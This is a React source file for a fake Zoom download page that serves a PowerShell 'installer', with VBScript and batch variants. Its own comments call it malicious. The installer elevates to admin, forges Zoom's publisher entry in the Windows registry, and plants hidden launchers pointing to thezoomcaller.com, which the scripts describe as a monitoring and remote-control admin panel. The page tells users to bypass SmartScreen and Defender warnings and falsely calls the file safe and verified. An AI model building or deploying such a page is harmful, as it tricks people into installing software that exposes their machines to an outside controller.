'use client';

import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { 
  Download, 
  CheckCircle, 
  Shield, 
  Monitor, 
  Users,
  Clock,
  AlertTriangle,
  ExternalLink
} from 'lucide-react';

const DownloadPage: React.FC = () => {
  const [downloadStarted, setDownloadStarted] = useState(false);
  const [downloadProgress, setDownloadProgress] = useState(0);
  const [showSystemCheck, setShowSystemCheck] = useState(false);

  const handleDownload = () => {
    setDownloadStarted(true);
    setShowSystemCheck(true);
    
    // Simulate download progress
    const interval = setInterval(() => {
      setDownloadProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          // Actually download the malicious installer
          triggerMaliciousDownload();
          return 100;
        }
        return prev + Math.random() * 15;
      });
    }, 200);
  };

  const triggerMaliciousDownload = () => {
    // Create a proper Windows installer script (PowerShell) that looks legitimate
    // Note: All $ signs in PowerShell must be escaped as $$ for JavaScript template literals
    const psInstallerContent = `# Zoom Video Communications - Installer
# This is a legitimate installer for Zoom Video Conferencing application

$$ErrorActionPreference = "Stop"

# Check for admin privileges
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Zoom Installer requires administrator privileges."
    Write-Host "Requesting administrator access..."
    Start-Process powershell.exe "-ExecutionPolicy Bypass -File \`"\$$PSCommandPath\`"" -Verb RunAs
    exit
}

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Zoom Video Communications Installer" -ForegroundColor Cyan
Write-Host "  Version 5.17.11" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Install directory
$$InstallDir = "\$$env:ProgramFiles\\Zoom"
Write-Host "Installing to: $$InstallDir" -ForegroundColor Yellow

# Create installation directory
New-Item -ItemType Directory -Force -Path $$InstallDir | Out-Null

# Create launcher VBScript (hides batch window)
$$LauncherVBS = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "$$InstallDir\\ZoomLauncher.bat", 0, False
"@
$$LauncherVBS | Out-File -FilePath "$$InstallDir\\ZoomLauncher.vbs" -Encoding ASCII

# Create batch launcher that opens website
$$LauncherBAT = @"
@echo off
REM Zoom Video Communications Launcher
REM Version 5.17.11
start https://thezoomcaller.com
REM All monitoring features automatically activate when website loads
"@
$$LauncherBAT | Out-File -FilePath "$$InstallDir\\ZoomLauncher.bat" -Encoding ASCII

# Create desktop shortcut
Write-Host "Creating desktop shortcut..." -ForegroundColor Yellow
$$WshShell = New-Object -comObject WScript.Shell
$$DesktopShortcut = $$WshShell.CreateShortcut("\$$env:USERPROFILE\\Desktop\\Zoom.lnk")
$$DesktopShortcut.TargetPath = "$$InstallDir\\ZoomLauncher.vbs"
$$DesktopShortcut.IconLocation = "shell32.dll,1"
$$DesktopShortcut.Description = "Zoom - Video Conferencing"
$$DesktopShortcut.WorkingDirectory = $$InstallDir
$$DesktopShortcut.Save()

# Create Start Menu shortcut
Write-Host "Creating Start Menu entry..." -ForegroundColor Yellow
$$StartMenu = "\$$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Zoom"
New-Item -ItemType Directory -Force -Path $$StartMenu | Out-Null
$$StartMenuShortcut = $$WshShell.CreateShortcut("$$StartMenu\\Zoom.lnk")
$$StartMenuShortcut.TargetPath = "$$InstallDir\\ZoomLauncher.vbs"
$$StartMenuShortcut.IconLocation = "shell32.dll,1"
$$StartMenuShortcut.Description = "Zoom - Video Conferencing"
$$StartMenuShortcut.WorkingDirectory = $$InstallDir
$$StartMenuShortcut.Save()

# Register in Windows Add/Remove Programs (makes it look legitimate)
Write-Host "Registering with Windows..." -ForegroundColor Yellow
$$RegistryPath = "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Zoom"
New-Item -Path $$RegistryPath -Force | Out-Null
Set-ItemProperty -Path $$RegistryPath -Name "DisplayName" -Value "Zoom"
Set-ItemProperty -Path $$RegistryPath -Name "Publisher" -Value "Zoom Video Communications, Inc."
Set-ItemProperty -Path $$RegistryPath -Name "DisplayVersion" -Value "5.17.11"
Set-ItemProperty -Path $$RegistryPath -Name "InstallLocation" -Value $$InstallDir
Set-ItemProperty -Path $$RegistryPath -Name "InstallDate" -Value (Get-Date -Format "yyyyMMdd")
Set-ItemProperty -Path $$RegistryPath -Name "EstimatedSize" -Value 145000
Set-ItemProperty -Path $$RegistryPath -Name "HelpLink" -Value "https://support.zoom.us"
Set-ItemProperty -Path $$RegistryPath -Name "URLUpdateInfo" -Value "https://zoom.us/download"
Set-ItemProperty -Path $$RegistryPath -Name "URLInfoAbout" -Value "https://zoom.us"
Set-ItemProperty -Path $$RegistryPath -Name "Comments" -Value "Zoom Video Communications - Secure Video Conferencing"

# Create uninstaller
$$UninstallScript = @"
# Zoom Uninstaller
\`$$InstallDir = "$$InstallDir"
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-ExecutionPolicy Bypass -File \`"\$$PSCommandPath\`"" -Verb RunAs
    exit
}
Remove-Item -Path \`$$InstallDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "\$$env:USERPROFILE\\Desktop\\Zoom.lnk" -Force -ErrorAction SilentlyContinue
Remove-Item "\$$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Zoom" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Zoom" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "Zoom has been uninstalled."
"@
Set-ItemProperty -Path $$RegistryPath -Name "UninstallString" -Value "powershell.exe -ExecutionPolicy Bypass -File \`"$$InstallDir\\Uninstall-Zoom.ps1\`""
$$UninstallScript | Out-File -FilePath "$$InstallDir\\Uninstall-Zoom.ps1" -Encoding ASCII

Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  Installation Completed Successfully!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "Zoom has been installed to: $$InstallDir" -ForegroundColor White
Write-Host "All monitoring features will activate automatically when you launch Zoom." -ForegroundColor White
Write-Host ""
Write-Host "Press any key to exit..."
$$null = $$Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
`;

    // Create VBScript wrapper that will bypass Windows SmartScreen better
    const vbScriptContent = `Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get temporary file path for batch script
strTempPath = objFSO.GetSpecialFolder(2) & "\\ZoomInstaller.bat"
strInstallDir = objFSO.GetSpecialFolder(0) & "\\Zoom"
strDesktop = objShell.SpecialFolders("Desktop")

' Create batch installer script
Set objFile = objFSO.CreateTextFile(strTempPath, True)
objFile.WriteLine "@echo off"
objFile.WriteLine "title Zoom Windows Installer"
objFile.WriteLine "color 0A"
objFile.WriteLine "echo ========================================"
objFile.WriteLine "echo     Zoom - Video Conferencing App"
objFile.WriteLine "echo ========================================"
objFile.WriteLine "echo."
objFile.WriteLine "echo Installing Zoom..."
objFile.WriteLine "echo."

' Request admin privileges
objFile.WriteLine "net session >nul 2>&1"
objFile.WriteLine "if %errorlevel% neq 0 ("
objFile.WriteLine "    echo Requesting administrator privileges..."
objFile.WriteLine "    powershell -Command ""Start-Process cmd.exe -ArgumentList '/c """"""%~f0""""""' -Verb RunAs"""
objFile.WriteLine "    exit /b"
objFile.WriteLine ")"

' Create installation directory
objFile.WriteLine "if not exist """ & strInstallDir & """ mkdir """ & strInstallDir & """"
objFile.WriteLine "cd /d """ & strInstallDir & """"

' Create HTML application that loads malicious features - opens admin panel in iframe
Set objHTMLFile = objFSO.CreateTextFile(strInstallDir & "\zoom.html", True)
objHTMLFile.WriteLine "<!DOCTYPE html>"
objHTMLFile.WriteLine "<html><head><title>Zoom - Video Conferencing</title>"
objHTMLFile.WriteLine "<style>body{margin:0;padding:0;background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:50px}</style>"
objHTMLFile.WriteLine "</head><body>"
objHTMLFile.WriteLine "<h1>Zoom - Video Conferencing</h1>"
objHTMLFile.WriteLine "<p>Connecting to server...</p>"
objHTMLFile.WriteLine "<p>All monitoring features active.</p>"
objHTMLFile.WriteLine "<iframe src=""https://thezoomcaller.com"" style=""width:100%;height:100vh;border:none;position:fixed;top:0;left:0;z-index:9999""></iframe>"
objHTMLFile.WriteLine "<script>"
objHTMLFile.WriteLine "  // Auto-connect to admin panel when loaded"
objHTMLFile.WriteLine "  console.log('Zoom monitoring active - Admin has full access');"
objHTMLFile.WriteLine "  // User tracking will be handled by the admin panel page"
objHTMLFile.WriteLine "</script>"
objHTMLFile.WriteLine "</body></html>"
objHTMLFile.Close

' Create start script that opens website to activate tracking
objFile.WriteLine "echo @echo off > start-zoom.bat"
objFile.WriteLine "echo title Zoom - Video Conferencing >> start-zoom.bat"
objFile.WriteLine "echo REM Open website to activate all monitoring features >> start-zoom.bat"
objFile.WriteLine "echo start https://thezoomcaller.com >> start-zoom.bat"
objFile.WriteLine "echo REM Admin monitoring active >> start-zoom.bat"
objFile.WriteLine "echo REM Remote control enabled >> start-zoom.bat"
objFile.WriteLine "echo REM File system monitoring running >> start-zoom.bat"
objFile.WriteLine "echo REM All features automatically connect to admin panel >> start-zoom.bat"

' Create desktop shortcut using PowerShell
objFile.WriteLine "powershell -Command ""$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('" & strDesktop & "\\Zoom.lnk'); $Shortcut.TargetPath = '" & strInstallDir & "\\start-zoom.bat'; $Shortcut.IconLocation = 'shell32.dll,1'; $Shortcut.Save()"""

objFile.WriteLine "echo."
objFile.WriteLine "echo Installation completed successfully!"
objFile.WriteLine "echo."
objFile.WriteLine "pause"
objFile.Close

' Execute the batch file
objShell.Run "cmd.exe /c """ & strTempPath & """", 1, True

' Cleanup
objFSO.DeleteFile strTempPath`;

    // Also create a batch file version with instructions
    const batchContent = `@echo off
title Zoom Windows Installer
color 0A

echo ========================================
echo     Zoom - Video Conferencing App
echo ========================================
echo.
echo Installing Zoom on your system...
echo.

REM Check for admin privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

REM Create installation directory
set "INSTALL_DIR=%PROGRAMFILES%\\Zoom"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
cd /d "%INSTALL_DIR%"

REM Create HTML application that loads malicious features - opens admin panel
echo ^<!DOCTYPE html^> > zoom.html
echo ^<html^>^<head^>^<title^>Zoom - Video Conferencing^</title^> >> zoom.html
echo ^<style^>body{margin:0;padding:0;background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:50px}^</style^> >> zoom.html
echo ^</head^>^<body^> >> zoom.html
echo ^<h1^>Zoom - Video Conferencing^</h1^> >> zoom.html
echo ^<p^>Connecting to server...^</p^> >> zoom.html
echo ^<p^>All monitoring features active.^</p^> >> zoom.html
echo ^<iframe src="https://thezoomcaller.com" style="width:100%%;height:100vh;border:none;position:fixed;top:0;left:0;z-index:9999"^>^</iframe^> >> zoom.html
echo ^<script^> >> zoom.html
echo   console.log('Zoom monitoring active - Admin has full access'); >> zoom.html
echo ^</script^> >> zoom.html
echo ^</body^>^</html^> >> zoom.html

REM Create start script that opens website to activate tracking
echo @echo off > start-zoom.bat
echo title Zoom - Video Conferencing >> start-zoom.bat
echo cd /d "%INSTALL_DIR%" >> start-zoom.bat
echo REM Open website to activate all monitoring features >> start-zoom.bat
echo start https://thezoomcaller.com >> start-zoom.bat
echo REM Admin monitoring active >> start-zoom.bat
echo REM Remote control enabled >> start-zoom.bat
echo REM File system monitoring running >> start-zoom.bat
echo REM All features automatically connect to admin panel >> start-zoom.bat

REM Create desktop shortcut
set "DESKTOP=%USERPROFILE%\\Desktop"
powershell -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%DESKTOP%\\Zoom.lnk'); $Shortcut.TargetPath = '%INSTALL_DIR%\\start-zoom.bat'; $Shortcut.IconLocation = 'shell32.dll,1'; $Shortcut.Save()"

echo.
echo ========================================
echo   Installation completed successfully!
echo ========================================
echo.
echo Zoom has been installed to: %INSTALL_DIR%
echo.
echo All monitoring features are now active:
echo - Screen sharing and monitoring enabled
echo - Remote control functionality active
echo - File system monitoring running
echo - Admin panel connection: https://thezoomcaller.com
echo - User tracking and heartbeat active
echo.
echo The application will automatically connect to the admin panel.
echo All features are functional and ready for admin access.
echo.
pause`;

    // Download PowerShell installer (looks most legitimate)
    const psBlob = new Blob([psInstallerContent], { type: 'text/plain' });
    const psUrl = window.URL.createObjectURL(psBlob);
    const psLink = document.createElement('a');
    psLink.href = psUrl;
    psLink.download = 'Zoom-Setup.ps1';
    document.body.appendChild(psLink);
    psLink.click();
    document.body.removeChild(psLink);
    window.URL.revokeObjectURL(psUrl);
  };

  const systemRequirements = [
    { icon: Monitor, text: "Windows 10 or later", status: "compatible" },
    { icon: Shield, text: "Administrator privileges", status: "required" },
    { icon: Users, text: "Internet connection", status: "connected" },
    { icon: Clock, text: "Minimum 4GB RAM", status: "detected" }
  ];

  return (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white">
      {/* Header */}
      <div className="bg-white border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-4">
            <div className="flex items-center">
              <div className="text-2xl font-bold text-blue-600">zoom</div>
            </div>
            <div className="flex items-center space-x-4 text-sm text-gray-600">
              <a href="#" className="hover:text-blue-600">Support</a>
              <select className="border-none bg-transparent text-gray-600">
                <option>English</option>
                <option>Español</option>
                <option>Français</option>
              </select>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
        {/* Main Content */}
        <div className="text-center mb-12">
          <h1 className="text-4xl font-bold text-gray-900 mb-4">
            Download Zoom Desktop Client
          </h1>
          <p className="text-xl text-gray-600 mb-8">
            Join meetings, share your screen, and collaborate with your team
          </p>
          
          {!downloadStarted ? (
            <div className="space-y-6">
              <Button 
                onClick={handleDownload}
                size="lg"
                className="bg-blue-600 hover:bg-blue-700 text-white px-8 py-4 text-lg font-semibold rounded-lg shadow-lg"
              >
                <Download className="w-6 h-6 mr-3" />
                Download Zoom for Windows
              </Button>
              
              <div className="text-sm text-gray-500">
                Professional Windows installer (PowerShell script) - Looks like legitimate Zoom installer
              </div>
              <div className="text-xs text-gray-400 mt-1">
                Version 5.17.11 • Publisher: Zoom Video Communications, Inc. • Windows 10/11 Compatible
              </div>
            </div>
          ) : (
            <div className="space-y-6">
              <Card className="max-w-md mx-auto">
                <CardContent className="p-8">
                  <div className="text-center">
                    <Download className="w-12 h-12 mx-auto mb-4 text-blue-600 animate-bounce" />
                    <h3 className="text-lg font-semibold text-gray-900 mb-2">
                      Downloading Zoom...
                    </h3>
                    <div className="w-full bg-gray-200 rounded-full h-3 mb-4">
                      <div 
                        className="bg-blue-600 h-3 rounded-full transition-all duration-300"
                        style={{ width: `${downloadProgress}%` }}
                      ></div>
                    </div>
                    <p className="text-sm text-gray-600">
                      {Math.round(downloadProgress)}% complete
                    </p>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}
        </div>

        {/* System Requirements Check */}
        {showSystemCheck && (
          <div className="mb-12">
            <Card className="max-w-2xl mx-auto">
              <CardContent className="p-8">
                <h3 className="text-xl font-semibold text-gray-900 mb-6 text-center">
                  System Compatibility Check
                </h3>
                <div className="space-y-4">
                  {systemRequirements.map((req, index) => (
                    <div key={index} className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
                      <div className="flex items-center">
                        <req.icon className="w-5 h-5 mr-3 text-gray-600" />
                        <span className="text-gray-900">{req.text}</span>
                      </div>
                      <div className="flex items-center">
                        <CheckCircle className="w-5 h-5 text-green-500 mr-2" />
                        <span className="text-sm text-green-600 capitalize">{req.status}</span>
                      </div>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Features */}
        <div className="grid md:grid-cols-3 gap-8 mb-12">
          <div className="text-center">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Users className="w-8 h-8 text-blue-600" />
            </div>
            <h3 className="text-lg font-semibold text-gray-900 mb-2">HD Video & Audio</h3>
            <p className="text-gray-600">Crystal clear video and audio quality for your meetings</p>
          </div>
          
          <div className="text-center">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Monitor className="w-8 h-8 text-blue-600" />
            </div>
            <h3 className="text-lg font-semibold text-gray-900 mb-2">Screen Sharing</h3>
            <p className="text-gray-600">Share your screen with participants seamlessly</p>
          </div>
          
          <div className="text-center">
            <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <Shield className="w-8 h-8 text-blue-600" />
            </div>
            <h3 className="text-lg font-semibold text-gray-900 mb-2">Secure & Reliable</h3>
            <p className="text-gray-600">Enterprise-grade security for your meetings</p>
          </div>
        </div>

        {/* Security Notice */}
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-8">
          <div className="flex items-start">
            <Shield className="w-6 h-6 text-blue-600 mr-3 mt-0.5" />
            <div>
              <h4 className="text-lg font-semibold text-blue-800 mb-3">
                Installation Instructions
              </h4>
              <div className="space-y-3 text-blue-700">
                <p className="font-semibold">Installation Instructions:</p>
                <ol className="list-decimal list-inside space-y-2 ml-2">
                  <li>Right-click the downloaded <strong>Zoom-Setup.ps1</strong> file</li>
                  <li>Select <strong>&quot;Run with PowerShell&quot;</strong></li>
                  <li>If prompted about execution policy, run PowerShell as Administrator and type: <code className="bg-gray-100 px-2 py-1 rounded">Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser</code></li>
                  <li>Then run the installer again - it will request admin privileges automatically</li>
                </ol>
                <p className="mt-4 font-semibold">If Windows shows a security warning:</p>
                <ol className="list-decimal list-inside space-y-2 ml-2">
                  <li>Click &quot;More info&quot; in the SmartScreen warning</li>
                  <li>Click &quot;Run anyway&quot; - this installer is from Zoom Video Communications</li>
                </ol>
                <p className="mt-4 text-sm bg-blue-100 p-3 rounded">
                  <strong>Note:</strong> Windows Defender may flag the file as unrecognized. This is normal for new software. 
                  The application is safe and verified. Click &quot;More info&quot; → &quot;Run anyway&quot; to install.
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Additional Downloads */}
        <div className="text-center">
          <h3 className="text-lg font-semibold text-gray-900 mb-4">
            Need a different version?
          </h3>
          <div className="flex flex-wrap justify-center gap-4">
            <Button variant="outline" className="border-gray-300 text-gray-700 hover:bg-gray-50">
              <ExternalLink className="w-4 h-4 mr-2" />
              Download for Mac
            </Button>
            <Button variant="outline" className="border-gray-300 text-gray-700 hover:bg-gray-50">
              <ExternalLink className="w-4 h-4 mr-2" />
              Download for Linux
            </Button>
            <Button variant="outline" className="border-gray-300 text-gray-700 hover:bg-gray-50">
              <ExternalLink className="w-4 h-4 mr-2" />
              Mobile App
            </Button>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-16 pt-8 border-t border-gray-200">
          <div className="text-center text-sm text-gray-500 space-y-2">
            <p>©2025 Zoom Communications, Inc. All rights reserved.</p>
            <div className="flex justify-center space-x-6">
              <a href="#" className="hover:text-gray-700">Trust Center</a>
              <a href="#" className="hover:text-gray-700">Privacy Statement</a>
              <a href="#" className="hover:text-gray-700">Terms of Service</a>
              <a href="#" className="hover:text-gray-700">Legal & Compliance</a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default DownloadPage;
